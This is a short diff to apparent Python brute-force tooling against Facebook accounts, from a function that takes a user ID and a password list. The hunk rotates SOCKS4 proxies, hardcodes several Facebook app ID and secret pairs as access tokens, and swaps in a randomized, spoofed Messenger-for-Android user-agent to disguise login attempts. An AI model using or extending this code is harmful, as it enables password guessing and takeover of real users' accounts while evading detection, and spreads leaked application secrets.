@@ -73,7 +73,7 @@ def bgraph(userid,passwordlist,total_target):
             proxs = {'http': 'socks4://'+random.choice(proxy)}
             accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
             app = random.choice(['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038'])
-            useragent = Dalvik/2.1.0 (Linux; U; Android 10; ADT1061 Build/QP1A.190711.020)
+            useragent = "[FBAN/Orca-Android;FBAV/335.0.0.57.127;FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.randint(200000000,299999999))+";FBCR/Null;FBMF/samsung;FBBD/samsung;FBDV/SM-T"+str(random.randint(100,900))+";FBSV/7.3.9;FBCA/armeabi-v8a:armeabi;FBDM/{density=4.0,width=1440,height=2768};]"
             data = {
                 'adid': uuid.uuid4(),
                 'format': 'json',
